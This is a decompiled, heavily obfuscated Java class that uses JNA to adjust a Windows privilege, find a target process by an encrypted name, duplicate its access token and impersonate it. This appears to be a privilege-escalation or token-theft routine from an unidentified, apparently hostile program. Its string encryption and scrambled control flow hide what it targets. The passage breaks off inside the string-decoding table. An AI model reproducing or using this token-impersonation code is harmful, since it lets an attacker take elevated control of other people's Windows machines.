/*
 * Decompiled with CFR 0.152.
 */
package a.b.c.g;

import a.b.c.g.af;
import a.b.c.g.an;
import a.b.c.g.g;
import com.sun.jna.Native;
import com.sun.jna.platform.win32.Advapi32;
import com.sun.jna.platform.win32.Kernel32;
import com.sun.jna.platform.win32.Tlhelp32;
import com.sun.jna.platform.win32.WinDef;
import com.sun.jna.platform.win32.WinNT;
import com.sun.jna.ptr.IntByReference;

class ad {
    private WinNT.HANDLE a;
    private WinNT.HANDLE b;
    private static final String[] c;
    private static final String[] d;
    private static final long[] e;
    private static final Integer[] f;

    private ad() {
    }

    /*
     * WARNING - Removed try catching itself - possible behaviour change.
     * Loose catch block
     */
    public void start() throws Exception {
        block77: {
            IntByReference intByReference;
            block76: {
                ad ad2;
                WinNT.HANDLE hANDLE;
                block74: {
                    boolean bl;
                    block75: {
                        WinNT.HANDLEByReference hANDLEByReference;
                        block89: {
                            block88: {
                                block72: {
                                    WinNT.HANDLEByReference hANDLEByReference2;
                                    block69: {
                                        block68: {
                                            block65: {
                                                WinNT.HANDLE hANDLE2;
                                                Tlhelp32.PROCESSENTRY32.ByReference byReference;
                                                block64: {
                                                    block63: {
                                                        intByReference = new IntByReference();
                                                        bl = g.i();
                                                        try {
                                                            if (af.INSTANCE.RtlAdjustPrivilege(ad.a(23980, 8769430402185828067L), true, false, intByReference) != 0) {
                                                                throw new Exception(ad.a(-26148, 400));
                                                            }
                                                        }
                                                        catch (Exception exception) {
                                                            throw ad.a(exception);
                                                        }
                                                        byReference = new Tlhelp32.PROCESSENTRY32.ByReference();
                                                        hANDLE2 = Kernel32.INSTANCE.CreateToolhelp32Snapshot(Tlhelp32.TH32CS_SNAPPROCESS, new WinDef.DWORD(0L));
                                                        if (!bl) break block63;
                                                        try {
                                                            block82: {
                                                                if (hANDLE2 != WinNT.INVALID_HANDLE_VALUE) break block64;
                                                                break block82;
                                                                catch (Exception exception) {
                                                                    throw ad.a(exception);
                                                                }
                                                            }
                                                            af.INSTANCE.RtlAdjustPrivilege(ad.a(5984, 8310699475041377325L), false, false, intByReference);
                                                        }
                                                        catch (Exception exception) {
                                                            throw ad.a(exception);
                                                        }
                                                    }
                                                    throw new Exception(ad.a(-26150, -15412));
                                                }
                                                try {
                                                    boolean bl2;
                                                    block58: while (true) {
                                                        boolean bl3 = Kernel32.INSTANCE.Process32Next(hANDLE2, byReference);
                                                        while (bl3) {
                                                            block66: {
                                                                ad ad3;
                                                                block67: {
                                                                    block84: {
                                                                        block83: {
                                                                            try {
                                                                                bl2 = ad.a(-26149, -26347).equalsIgnoreCase(Native.toString(byReference.szExeFile));
                                                                                if (!bl) break block65;
                                                                                if (!bl) continue;
                                                                            }
                                                                            catch (Exception exception) {
                                                                                throw ad.a(exception);
                                                                            }
                                                                            if (!bl2) continue block58;
                                                                            this.a = Kernel32.INSTANCE.OpenProcess(ad.a(22741, 5070952574421734297L), false, byReference.th32ProcessID.intValue());
                                                                            ad3 = this;
                                                                            if (!bl) break block66;
                                                                            if (ad3.a == null) break block67;
                                                                            break block83;
                                                                            catch (Exception exception) {
                                                                                throw ad.a(exception);
                                                                            }
                                                                        }
                                                                        ad3 = this;
                                                                        if (!bl) break block66;
                                                                        break block84;
                                                                        catch (Exception exception) {
                                                                            throw ad.a(exception);
                                                                        }
                                                                    }
                                                                    try {
                                                                        if (ad3.a != WinNT.INVALID_HANDLE_VALUE) {
                                                                            break block58;
                                                                        }
                                                                        break block67;
                                                                        catch (Exception exception) {
                                                                            throw ad.a(exception);
                                                                        }
                                                                    }
                                                                    catch (Exception exception) {
                                                                        throw ad.a(exception);
                                                                    }
                                                                }
                                                                ad3 = this;
                                                            }
                                                            ad3.a = null;
                                                            if (!bl) break block58;
                                                            continue block58;
                                                        }
                                                        break;
                                                    }
                                                    bl2 = Kernel32.INSTANCE.CloseHandle(hANDLE2);
                                                }
                                                catch (Throwable throwable) {
                                                    Kernel32.INSTANCE.CloseHandle(hANDLE2);
                                                    throw throwable;
                                                }
                                            }
                                            try {
                                                if (this.a == null) {
                                                    af.INSTANCE.RtlAdjustPrivilege(ad.a(5984, 8310699475041377325L), false, false, intByReference);
                                                    throw new Exception(ad.a(-26147, 25969));
                                                }
                                            }
                                            catch (Exception exception) {
                                                throw ad.a(exception);
                                            }
                                            hANDLEByReference2 = new WinNT.HANDLEByReference();
                                            int n2 = Advapi32.INSTANCE.OpenProcessToken(this.a, ad.a(20956, 7525649560974629522L), hANDLEByReference2);
                                            if (!bl) break block68;
                                            try {
                                                block85: {
                                                    if (n2 != 0) break block69;
                                                    break block85;
                                                    catch (Exception exception) {
                                                        throw ad.a(exception);
                                                    }
                                                }
                                                Kernel32.INSTANCE.CloseHandle(this.a);
                                                n2 = af.INSTANCE.RtlAdjustPrivilege(ad.a(5984, 8310699475041377325L), false, false, intByReference);
                                            }
                                            catch (Exception exception) {
                                                throw ad.a(exception);
                                            }
                                        }
                                        throw new Exception(ad.a(-26145, 13882) + Kernel32.INSTANCE.GetLastError());
                                    }
                                    hANDLEByReference = new WinNT.HANDLEByReference();
                                    try {
                                        boolean bl4;
                                        block73: {
                                            block70: {
                                                block71: {
                                                    bl4 = Advapi32.INSTANCE.DuplicateToken(hANDLEByReference2.getValue(), 2, hANDLEByReference);
                                                    if (!bl) break block70;
                                                    try {
                                                        block86: {
                                                            if (bl4) break block71;
                                                            break block86;
                                                            catch (Exception exception) {
                                                                throw ad.a(exception);
                                                            }
                                                        }
                                                        throw new Exception(ad.a(-26151, -19821) + Kernel32.INSTANCE.GetLastError());
                                                    }
                                                    catch (Exception exception) {
                                                        throw ad.a(exception);
                                                    }
                                                }
                                                bl4 = Advapi32.INSTANCE.ImpersonateLoggedOnUser(hANDLEByReference.getValue());
                                            }
                                            if (!bl) break block72;
                                            try {
                                                block87: {
                                                    if (bl4) break block73;
                                                    break block87;
                                                    catch (Exception exception) {
                                                        throw ad.a(exception);
                                                    }
                                                }
                                                Kernel32.INSTANCE.CloseHandle(hANDLEByReference.getValue());
                                                throw new Exception(ad.a(-26152, -6035) + Kernel32.INSTANCE.GetLastError());
                                            }
                                            catch (Exception exception) {
                                                throw ad.a(exception);
                                            }
                                        }
                                        this.b = hANDLEByReference.getValue();
                                        bl4 = Kernel32.INSTANCE.CloseHandle(hANDLEByReference2.getValue());
                                    }
                                    catch (Throwable throwable) {
                                        block81: {
                                            block80: {
                                                ad ad4;
                                                WinNT.HANDLE hANDLE3;
                                                block78: {
                                                    block79: {
                                                        try {
                                                            try {
                                                                try {
                                                                    try {
                                                                        Kernel32.INSTANCE.CloseHandle(hANDLEByReference2.getValue());
                                                                        hANDLE3 = this.b;
                                                                        if (!bl) break block78;
                                                                        if (hANDLE3 != null) break block79;
                                                                    }
                                                                    catch (Exception exception) {
                                                                        throw ad.a(exception);
                                                                    }
                                                                    hANDLE3 = hANDLEByReference.getValue();
                                                                    if (!bl) break block78;
                                                                }
                                                                catch (Exception exception) {
                                                                    throw ad.a(exception);
                                                                }
                                                                if (hANDLE3 == null) break block79;
                                                            }
                                                            catch (Exception exception) {
                                                                throw ad.a(exception);
                                                            }
                                                            Kernel32.INSTANCE.CloseHandle(hANDLEByReference.getValue());
                                                        }
                                                        catch (Exception exception) {
                                                            throw ad.a(exception);
                                                        }
                                                    }
                                                    try {
                                                        ad4 = this;
                                                        if (!bl) break block80;
                                                        hANDLE3 = ad4.b;
                                                    }
                                                    catch (Exception exception) {
                                                        throw ad.a(exception);
                                                    }
                                                }
                                                try {
                                                    if (hANDLE3 != null) break block81;
                                                    Kernel32.INSTANCE.CloseHandle(this.a);
                                                    ad4 = this;
                                                }
                                                catch (Exception exception) {
                                                    throw ad.a(exception);
                                                }
                                            }
                                            ad4.a = null;
                                            af.INSTANCE.RtlAdjustPrivilege(ad.a(5984, 8310699475041377325L), false, false, intByReference);
                                        }
                                        throw throwable;
                                    }
                                }
                                hANDLE = this.b;
                                if (!bl) break block74;
                                if (hANDLE != null) break block75;
                                break block88;
                                catch (Exception exception) {
                                    throw ad.a(exception);
                                }
                            }
                            hANDLE = hANDLEByReference.getValue();
                            if (!bl) break block74;
                            break block89;
                            catch (Exception exception) {
                                throw ad.a(exception);
                            }
                        }
                        try {
                            block90: {
                                if (hANDLE == null) break block75;
                                break block90;
                                catch (Exception exception) {
                                    throw ad.a(exception);
                                }
                            }
                            Kernel32.INSTANCE.CloseHandle(hANDLEByReference.getValue());
                        }
                        catch (Exception exception) {
                            throw ad.a(exception);
                        }
                    }
                    try {
                        ad2 = this;
                        if (!bl) break block76;
                        hANDLE = ad2.b;
                    }
                    catch (Exception exception) {
                        throw ad.a(exception);
                    }
                }
                try {
                    if (hANDLE != null) break block77;
                    Kernel32.INSTANCE.CloseHandle(this.a);
                    ad2 = this;
                }
                catch (Exception exception) {
                    throw ad.a(exception);
                }
            }
            ad2.a = null;
            af.INSTANCE.RtlAdjustPrivilege(ad.a(5984, 8310699475041377325L), false, false, intByReference);
        }
    }

    public void close() {
        WinNT.HANDLE hANDLE;
        block7: {
            block8: {
                boolean bl = g.i();
                Advapi32.INSTANCE.RevertToSelf();
                boolean bl2 = bl;
                try {
                    try {
                        hANDLE = this.b;
                        if (!bl2) break block7;
                        if (hANDLE == null) break block8;
                    }
                    catch (RuntimeException runtimeException) {
                        throw ad.a(runtimeException);
                    }
                    Kernel32.INSTANCE.CloseHandle(this.b);
                }
                catch (RuntimeException runtimeException) {
                    throw ad.a(runtimeException);
                }
            }
            hANDLE = this.a;
        }
        try {
            if (hANDLE != null) {
                Kernel32.INSTANCE.CloseHandle(this.a);
            }
        }
        catch (RuntimeException runtimeException) {
            throw ad.a(runtimeException);
        }
    }

    ad(an an2) {
        this();
    }

    private static Exception a(Exception exception) {
        return exception;
    }

    /*
     * Unable to fully structure code
     */
    static {
        block29: {
            block28: {
                block27: {
                    block26: {
                        var13 = new String[7];
                        var11_1 = 0;
                        var10_2 = "\u00113\u00a7\u00b2\u00ebD\u00d6u\u00ad9p\u009ay\u00b5@,t%\u00a7\u0015\u00ff\u00d7h \u00ad\u0000\u009c\u00c6\u0097\u00f2/\u00abY\u009b`\u00cd:\u0095$\u0003R\u0085\u00c4\u00d3\u00c6f\u00e8\u001c$\u00ce\u00d7v]\u0014a)\t\u0013B\u00dbEM\u000b_t\u0018\u001fxrxp\u00ba\u00b6w\u00f6\u0000\t\u0089\u00ad\u00a8\u0082AC\u0017\u0011\u00b2a\u00e6\u00bc\u00f1\u00bf\u00ffc*!\u00e2Z\u00e0G|E2\u00a1t\u00bdIgg\u008ah%'\u0017\u0011\u00f6\u00cc\u001f\r8\u00f0m\u00fe\u0017;\u00bcUFg\u00ed;a\u00e0sE\u000bo\u0019\u0080\u008d\u00d4\u00d8\f\u00e8\u007f\u0097x/lO\b\u00c7#\u00bdH\u000f&\u009f\u00a5y$\u00fe\u0006\u00fd\u00ca5\r\u00daC\u00ff\u001f";
                        var12_3 = "\u00113\u00a7\u00b2\u00ebD\u00d6u\u00ad9p\u009ay\u00b5@,t%\u00a7\u0015\u00ff\u00d7h \u00ad\u0000\u009c\u00c6\u0097\u00f2/\u00abY\u009b`\u00cd:\u0095$\u0003R\u0085\u00c4\u00d3\u00c6f\u00e8\u001c$\u00ce\u00d7v]\u0014a)\t\u0013B\u00dbEM\u000b_t\u0018\u001fxrxp\u00ba\u00b6w\u00f6\u0000\t\u0089\u00ad\u00a8\u0082AC\u0017\u0011\u00b2a\u00e6\u00bc\u00f1\u00bf\u00ffc*!\u00e2Z\u00e0G|E2\u00a1t\u00bdIgg\u008ah%'\u0017\u0011\u00f6\u00cc\u001f\r8\u00f0m\u00fe\u0017;\u00bcUFg\u00ed;a\u00e0sE\u000bo\u0019\u0080\u008d\u00d4\u00d8\f\u00e8\u007f\u0097x/lO\b\u00c7#\u00bdH\u000f&\u009f\u00a5y$\u00fe\u0006\u00fd\u00ca5\r\u00daC\u00ff\u001f".length();
                        var9_4 = 23;
                        var8_5 = -1;
lbl7:
                        // 2 sources

                        while (true) {
                            v0 = 63;
                            v1 = ++var8_5;
                            v2 = var10_2.substring(v1, v1 + var9_4);
                            v3 = -1;
                            break block26;
                            break;
                        }
lbl13:
                        // 1 sources

                        while (true) {
                            var13[var11_1++] = v4.intern();
                            if ((var8_5 += var9_4) < var12_3) {
                                var9_4 = var10_2.charAt(var8_5);
                                ** continue;
                            }
                            var10_2 = "N*\u00d1\u00c1\u00d5\u00eb\u001b\u00a1\u00b1\u0011t\u00a6p]oy\u00d3\u0010\u00f5)Z\u00cbn\u00cf\u00e3\u00ce\u0019\u00dbN6\u0017\u00e5\u0080\u0019\u0018\t?\u0094\u00b0\u0015k\u00bd\u00134}\u0001\u008b\u00dd\u00d6J\u00cc)\u0012\u00b0+wy\u00e2B";
                            var12_3 = "N*\u00d1\u00c1\u00d5\u00eb\u001b\u00a1\u00b1\u0011t\u00a6p]oy\u00d3\u0010\u00f5)Z\u00cbn\u00cf\u00e3\u00ce\u0019\u00dbN6\u0017\u00e5\u0080\u0019\u0018\t?\u0094\u00b0\u0015k\u00bd\u00134}\u0001\u008b\u00dd\u00d6J\u00cc)\u0012\u00b0+wy\u00e2B".length();
                            var9_4 = 33;
                            var8_5 = -1;
lbl22:
                            // 2 sources

                            while (true) {
                                v0 = 57;
                                v5 = ++var8_5;
                                v2 = var10_2.substring(v5, v5 + var9_4);
                                v3 = 0;
                                break block26;
                                break;
                            }
                            break;
                        }
lbl28:
                        // 1 sources

                        while (true) {
                            var13[var11_1++] = v4.intern();
                            if ((var8_5 += var9_4) < var12_3) {
                                var9_4 = var10_2.charAt(var8_5);
                                ** continue;
                            }
                            break block27;
                            break;
                        }
                    }
                    v6 = v2.toCharArray();
                    v7 = v6.length;
                    var14_6 = 0;
                    v8 = v0;
                    v9 = v6;
                    v10 = v7;
                    if (v7 > 1) ** GOTO lbl85
                    do {
                        v11 = v8;
                        v9 = v9;
                        v12 = v9;
                        v13 = v8;
                        v14 = var14_6;
                        while (true) {
                            switch (var14_6 % 7) {
                                case 0: {
                                    v15 = 63;
                                    break;
                                }
                                case 1: {
                                    v15 = 13;
                                    break;
                                }
                                case 2: {
                                    v15 = 6;
                                    break;
                                }
                                case 3: {
                                    v15 = 26;
                                    break;
                                }
                                case 4: {
                                    v15 = 16;
                                    break;
                                }
                                case 5: {
                                    v15 = 11;
                                    break;
                                }
                                default: {
                                    v15 = 84;
                                }
                            }
                            v12[v14] = (char)(v12[v14] ^ (v13 ^ v15));
                            ++var14_6;
                            v8 = v11;
                            if (v11 != 0) break;
                            v11 = v8;
                            v9 = v9;
                            v14 = v8;
                            v12 = v9;
                            v13 = v8;
                        }
lbl85:
                        // 2 sources

                        v16 = v9;
                        v10 = v10;
                    } while (v10 > var14_6);
                    v4 = new String(v16);
                    switch (v3) {
                        default: {
                            ** continue;
                        }
                        ** case 0:
lbl95:
                        // 1 sources

                        ** continue;
                    }
                }
                ad.c = var13;
                ad.d = new String[7];
                var0_7 = 2596652535554808812L;
                var6_8 = new long[4];
                var3_9 = 0;
                var4_10 = "\u00fc\u00ab/n\u00ce\u0001G\u00d5\u00ae\"m\u00fc\u00e5\u009e\fe";
                var5_11 = "\u00fc\u00ab/n\u00ce\u0001G\u00d5\u00ae\"m\u00fc\u00e5\u009e\fe".length();
                var2_12 = 0;
                while (true) {
                    var7_13 = var4_10.substring(var2_12, var2_12 += 8).getBytes("ISO-8859-1");
                    v17 = var6_8;
                    v18 = var3_9++;
                    v19 = ((long)var7_13[0] & 255L) << 56 | ((long)var7_13[1] & 255L) << 48 | ((long)var7_13[2] & 255L) << 40 | ((long)var7_13[3] & 255L) << 32 | ((long)var7_13[4] & 255L) << 24 | ((long)var7_13[5] & 255L) << 16 | ((long)var7_13[6] & 255L) << 8 | (long)var7_13[7] & 255L;
                    v20 = -1;
                    break block28;
                    break;
                }
lbl112:
                // 1 sources

                while (true) {
                    v17[v18] = v21;
                    if (var2_12 < var5_11) ** continue;
                    var4_10 = "\u00fe Rp6\u0010\u008d\u001bX&\u00f3\u00d8\u0003+\u0001t";
                    var5_11 = "\u00fe Rp6\u0010\u008d\u001bX&\u00f3\u00d8\u0003+\u0001t".length();
                    var2_12 = 0;
                    while (true) {
                        var7_13 = var4_10.substring(var2_12, var2_12 += 8).getBytes("ISO-8859-1");
                        v17 = var6_8;
                        v18 = var3_9++;
                        v19 = ((long)var7_13[0] & 255L) << 56 | ((long)var7_13[1] & 255L) << 48 | ((long)var7_13[2] & 255L) << 40 | ((long)var7_13[3] & 255L) << 32 | ((long)var7_13[4] & 255L) << 24 | ((long)var7_13[5] & 255L) << 16 | ((long)var7_13[6] & 255L) << 8 | (long)var7_13[7] & 255L;
                        v20 = 0;
                        break block28;
                        break;
                    }
                    break;
                }
lbl125:
                // 1 sources

                while (true) {
                    v17[v18] = v21;
                    if (var2_12 < var5_11) ** continue;
                    break block29;
                    break;
                }
            }
            v21 = v19 ^ var0_7;
            switch (v20) {
                default: {
                    ** continue;
                }
                ** case 0:
lbl136:
                // 1 sources

                ** continue;
            }
        }
        ad.e = var6_8;
        ad.f = new Integer[4];
    }

    private static String a(int n2, int n3) {
        int n4 = (n2 ^ 0xFFFF99D9) & 0xFFFF;
        if (d[n4] == null) {
            int n5;
            int n6;
            char[] cArray = c[n4].toCharArray();
            switch (cArray[0] & 0xFF) {
                case 0: {
                    n6 = 75;
                    break;
                }
                case 1: {
                    n6 = 83;
                    break;
                }
                case 2: {
                    n6 = 247;
                    break;
                }
                case 3: {
                    n6 = 69;
                    break;
                }
                case 4: {
                    n6 = 177;
                    break;
                }
                case 5: {
                    n6 = 211;
                    break;
                }
                case 6: {
                    n6 = 122;
                    break;
                }
                case 7: {
                    n6 = 183;
                    break;
                }
                case 8: {
                    n6 = 42;
                    break;
                }
                case 9: {
                    n6 = 188;
                    break;
                }
                case 10: {
                    n6 = 99;
                    break;
                }
                case 11: {
                    n6 = 163;
                    break;
                }
                case 12: {
                    n6 = 7;
                    break;
                }
                case 13: {
                    n6 = 2;
                    break;
                }
                case 14: {
                    n6 = 111;
                    break;
                }
                case 15: {
                    n6 = 97;
                    break;
                }
                case 16: {
                    n6 = 26;
                    break;
                }
                case 17: {
                    n6 = 62;
                    break;
                }
                case 18: {
                    n6 = 79;
                    break;
                }
                case 19: {
                    n6 = 150;
                    break;
                }
                case 20: {
                    n6 = 248;
                    break;
                }
                case 21: {
                    n6 = 113;
                    break;
                }
                case 22: {
                    n6 = 162;
                    break;
                }
                case 23: {
                    n6 = 169;
                    break;
                }
                case 24: {
                    n6 = 164;
                    break;
                }
                case 25: {
                    n6 = 136;
                    break;
                }
                case 26: {
                    n6 = 53;
                    break;
                }
                case 27: {
                    n6 = 191;
                    break;
                }
                case 28: {
                    n6 = 125;
                    break;
                }
                case 29: {
                    n6 = 72;
                    break;
                }
                case 30: {
                    n6 = 233;
                    break;
                }
                case 31: {
                    n6 = 23;
                    break;
                }
                case 32: {
                    n6 = 16;
                    break;
                }
                case 33: {
                    n6 = 227;
                    break;
                }
                case 34: {
                    n6 = 232;
                    break;
                }
                case 35: {
                    n6 = 73;
                    break;
                }
                case 36: {
                    n6 = 133;
                    break;
                }
                case 37: {
                    n6 = 121;
                    break;
                }
                case 38: {
                    n6 = 159;
                    break;
                }
                case 39: {
                    n6 = 14;
                    break;
                }
                case 40: {
                    n6 = 254;
                    break;
                }
                case 41: {
                    n6 = 63;
                    break;
                }
                case 42: {
                    n6 = 74;
                    break;
                }
                case 43: {
                    n6 = 219;
                    break;
                }
                case 44: {
                    n6 = 10;
                    break;
                }
                case 45: {
                    n6 = 36;
                    break;
                }
                case 46: {
                    n6 = 5;
                    break;
                }
                case 47: {
                    n6 = 143;
                    break;
                }
                case 48: {
                    n6 = 151;
                    break;
                }
                case 49: {
                    n6 = 175;
                    break;
                }
                case 50: {
                    n6 = 33;
                    break;
                }
                case 51: {
                    n6 = 29;
                    break;
                }
                case 52: {
                    n6 = 223;
                    break;
                }
                case 53: {
                    n6 = 77;
                    break;
                }
                case 54: {
                    n6 = 87;
                    break;
                }
                case 55: {
                    n6 = 30;
                    break;
                }
                case 56: {
                    n6 = 13;
                    break;
                }
                case 57: {
                    n6 = 141;
                    break;
                }
                case 58: {
                    n6 = 82;
                    break;
                }
                case 59: {
                    n6 = 144;
                    break;
                }
                case 60: {
                    n6 = 135;
                    break;
                }
                case 61: {
                    n6 = 50;
                    break;
                }
                case 62: {
                    n6 = 64;
                    break;
                }
                case 63: {
                    n6 = 20;
                    break;
                }
                case 64: {
                    n6 = 157;
                    break;
                }
                case 65: {
                    n6 = 149;
                    break;
                }
                case 66: {
                    n6 = 239;
                    break;
                }
                case 67: {
                    n6 = 101;
                    break;
                }
                case 68: {
                    n6 = 55;
                    break;
                }
                case 69: {
                    n6 = 85;
                    break;
                }
                case 70: {
                    n6 = 166;
                    break;
                }
                case 71: {
                    n6 = 229;
                    break;
                }
                case 72: {
                    n6 = 130;
                    break;
                }
                case 73: {
                    n6 = 230;
                    break;
                }
                case 74: {
                    n6 = 21;
                    break;
                }
                case 75: {
                    n6 = 199;
                    break;
                }
                case 76: {
                    n6 = 105;
                    break;
                }
                case 77: {
                    n6 = 134;
                    break;
                }
                case 78: {
                    n6 = 170;
                    break;
                }
                case 79: {
                    n6 = 98;
                    break;
                }
                case 80: {
                    n6 = 171;
                    break;
                }
                case 81: {
                    n6 = 161;
                    break;
                }
                case 82: {
                    n6 = 255;
                    break;
                }
                case 83: {
                    n6 = 103;
                    break;
                }
                case 84: {
                    n6 = 201;
                    break;
                }
                case 85: {
                    n6 = 168;
                    break;
                }
                case 86: {
                    n6 = 60;
                    break;
                }
                case 87: {
                    n6 = 81;
                    break;
                }
                case 88: {
                    n6 = 251;
                    break;
                }
                case 89: {
                    n6 = 102;
                    break;
                }
                case 90: {
                    n6 = 90;
                    break;
                }
                case 91: {
                    n6 = 182;
                    break;
                }
                case 92: {
                    n6 = 250;
                    break;
                }
                case 93: {
                    n6 = 126;
                    break;
                }
                case 94: {
                    n6 = 237;
                    break;
                }
                case 95: {
                    n6 = 180;
                    break;
                }
                case 96: {
                    n6 = 41;
                    break;
                }
                case 97: {
                    n6 = 114;
                    break;
                }
                case 98: {
                    n6 = 68;
                    break;
                }
                case 99: {
                    n6 = 96;
                    break;
                }
                case 100: {
                    n6 = 93;
                    break;
                }
                case 101: {
                    n6 = 203;
                    break;
                }
                case 102: {
                    n6 = 155;
                    break;
                }
                case 103: {
                    n6 = 31;
                    break;
                }
                case 104: {
                    n6 = 165;
                    break;
                }
                case 105: {
                    n6 = 129;
                    break;
                }
                case 106: {
                    n6 = 206;
                    break;
                }
                case 107: {
                    n6 = 118;
                    break;
                }
                case 108: {
                    n6 = 57;
                    break;
                }
                case 109: {
                    n6 = 48;
                    break;
                }
                case 110: {
                    n6 = 117;
                    break;
                }
                case 111: {
                    n6 = 139;
                    break;
                }
                case 112: {
                    n6 = 110;
                    break;
                }
                case 113: {
                    n6 = 156;
                    break;
                }
                case 114: {
                    n6 = 37;
                    break;
                }
                case 115: {
                    n6 = 172;
                    break;
                }
                case 116: {
                    n6 = 226;
                    break;
                }
                case 117: {
                    n6 = 187;
                    break;
                }
                case 118: {
                    n6 = 174;
                    break;
                }
                case 119: {
                    n6 = 86;
                    break;
                }
                case 120: {
                    n6 = 145;
                    break;
                }
                case 121: {
                    n6 = 34;
                    break;
                }
                case 122: {
                    n6 = 244;
                    break;
                }
                case 123: {
                    n6 = 214;
                    break;
                }
                case 124: {
                    n6 = 65;
                    break;
                }
                case 125: {
                    n6 = 49;
                    break;
                }
                case 126: {
                    n6 = 71;
                    break;
                }
                case 127: {
                    n6 = 131;
                    break;
                }
                case 128: {
                    n6 = 104;
                    break;
                }
                case 129: {
                    n6 = 249;
                    break;
                }
                case 130: {
                    n6 = 51;
                    break;
                }
                case 131: {
                    n6 = 100;
                    break;
                }
                case 132: {
                    n6 = 112;
                    break;
                }
                case 133: {
                    n6 = 88;
                    break;
                }
                case 134: {
                    n6 = 39;
                    break;
                }
                case 135: {
                    n6 = 18;
                    break;
                }
                case 136: {
                    n6 = 238;
                    break;
                }
                case 137: {
                    n6 = 198;
                    break;
                }
                case 138: {
                    n6 = 228;
                    break;
                }
                case 139: {
                    n6 = 3;
                    break;
                }
                case 140: {
                    n6 = 0;
                    break;
                }
                case 141: {
                    n6 = 91;
                    break;
                }
                case 142: {
                    n6 = 67;
                    break;
                }
                case 143: {
                    n6 = 1;
                    break;
                }
                case 144: {
                    n6 = 132;
                    break;
                }
                case 145: {
                    n6 = 185;
                    break;
                }
                case 146: {
                    n6 = 195;
                    break;
                }
                case 147: {
                    n6 = 190;
                    break;
                }
                case 148: {
                    n6 = 107;
                    break;
                }
                case 149: {
                    n6 = 28;
                    break;
                }
                case 150: {
                    n6 = 52;
                    break;
                }
                case 151: {
                    n6 = 241;
                    break;
                }
                case 152: {
                    n6 = 216;
                    break;
                }
                case 153: {
                    n6 = 17;
                    break;
                }
                case 154: {
                    n6 = 220;
                    break;
                }
                case 155: {
                    n6 = 204;
                    break;
                }
                case 156: {
                    n6 = 27;
                    break;
                }
                case 157: {
                    n6 = 80;
                    break;
                }
                case 158: {
                    n6 = 221;
                    break;
                }
                case 159: {
                    n6 = 205;
                    break;
                }
                case 160: {
                    n6 = 189;
                    break;
                }
                case 161: {
                    n6 = 15;
                    break;
                }
                case 162: {
                    n6 = 208;
                    break;
                }
                case 163: {
                    n6 = 46;
                    break;
                }
                case 164: {
                    n6 = 66;
                    break;
                }
                case 165: {
                    n6 = 11;
                    break;
                }
                case 166: {
                    n6 = 242;
                    break;
                }
                case 167: {
                    n6 = 160;
                    break;
                }
                case 168: {
                    n6 = 84;
                    break;
                }
                case 169: {
                    n6 = 222;
                    break;
                }
                case 170: {
                    n6 = 181;
                    break;
                }
                case 171: {
                    n6 = 24;
                    break;
                }
                case 172: {
                    n6 = 54;
                    break;
                }
                case 173: {
                    n6 = 137;
                    break;
                }
                case 174: {
                    n6 = 246;
                    break;
                }
                case 175: {
                    n6 = 19;
                    break;
                }
                case 176: {
                    n6 = 142;
                    break;
                }
                case 177: {
                    n6 = 6;
                    break;
                }
                case 178: {
                    n6 = 192;
                    break;
                }
                case 179: {
                    n6 = 58;
                    break;
                }
                case 180: {
                    n6 = 124;
                    break;
                }
                case 181: {
                    n6 = 212;
                    break;
                }
                case 182: {
                    n6 = 70;
                    break;
                }
                case 183: {
                    n6 = 40;
                    break;
                }
                case 184: {
                    n6 = 207;
                    break;
                }
                case 185: {
                    n6 = 47;
                    break;
                }
                case 186: {
                    n6 = 217;
                    break;
                }
                case 187: {
                    n6 = 94;
                    break;
                }
                case 188: {
                    n6 = 115;
                    break;
                }
                case 189: {
                    n6 = 235;
                    break;
                }
                case 190: {
                    n6 = 231;
                    break;
                }
                case 191: {
                    n6 = 179;
                    break;
                }
                case 192: {
                    n6 = 173;
                    break;
                }
                case 193: {
                    n6 = 146;
                    break;
                }
                case 194: {
                    n6 = 59;
                    break;
                }
                case 195: {
                    n6 = 210;
                    break;
                }
                case 196: {
                    n6 = 184;
                    break;
                }
                case 197: {
                    n6 = 253;
                    break;
                }
                case 198: {
                    n6 = 202;
                    break;
                }
                case 199: {
                    n6 = 78;
                    break;
                }
                case 200: {
                    n6 = 186;
                    break;
                }
                case 201: {
                    n6 = 25;
                    break;
                }
                case 202: {
                    n6 = 32;
                    break;
                }
                case 203: {
                    n6 = 154;
                    break;
                }
                case 204: {
                    n6 = 12;
                    break;
                }
                case 205: {
                    n6 = 215;
                    break;
                }
                case 206: {
                    n6 = 45;
                    break;
                }
                case 207: {
                    n6 = 178;
                    break;
                }
                case 208: {
                    n6 = 8;
                    break;
                }
                case 209: {
                    n6 = 108;
                    break;
                }
                case 210: {
                    n6 = 119;
                    break;
                }
                case 211: {
                    n6 = 200;
                    break;
                }
                case 212: {
                    n6 = 43;
                    break;
                }
                case 213: {
                    n6 = 196;
                    break;
                }
                case 214: {
                    n6 = 218;
                    break;
                }
                case 215: {
                    n6 = 109;
                    break;
                }
                case 216: {
                    n6 = 44;
                    break;
                }
                case 217: {
                    n6 = 240;
                    break;
                }
                case 218: {
                    n6 = 116;
                    break;
                }
                case 219: {
                    n6 = 120;
                    break;
                }
                case 220: {
                    n6 = 252;
                    break;
                }
                case 221: {
                    n6 = 176;
                    break;
                }
                case 222: {
                    n6 = 225;
                    break;
                }
                case 223: {
                    n6 = 158;
                    break;
                }
                case 224: {
                    n6 = 224;
                    break;
                }
                case 225: {
                    n6 = 61;
                    break;
                }
                case 226: {
                    n6 = 197;
                    break;
                }
                case 227: {
                    n6 = 213;
                    break;
                }
                case 228: {
                    n6 = 140;
                    break;
                }
                case 229: {
                    n6 = 127;
                    break;
                }
                case 230: {
                    n6 = 153;
                    break;
                }
                case 231: {
                    n6 = 138;
                    break;
                }
                case 232: {
                    n6 = 123;
                    break;
                }
                case 233: {
                    n6 = 152;
                    break;
                }
                case 234: {
                    n6 = 38;
                    break;
                }
                case 235: {
                    n6 = 4;
                    break;
                }
                case 236: {
                    n6 = 236;
                    break;
                }
                case 237: {
                    n6 = 167;
                    break;
                }
                case 238: {
                    n6 = 147;
                    break;
                }
                case 239: {
                    n6 = 22;
                    break;
                }
                case 240: {
                    n6 = 148;
                    break;
                }
                case 241: {
                    n6 = 89;
                    break;
                }
                case 242: {
                    n6 = 193;
                    break;
                }
                case 243: {
                    n6 = 106;
                    break;
                }
                case 244: {
                    n6 = 209;
                    break;
                }
                case 245: {
                    n6 = 234;
                    break;
                }
                case 246: {
                    n6 = 76;
                    break;
                }
                case 247: {
                    n6 = 92;
                    break;
                }
                case 248: {
                    n6 = 56;
                    break;
                }
                case 249: {
                    n6 = 245;
                    break;
                }
                case 250: {
                    n6 = 243;
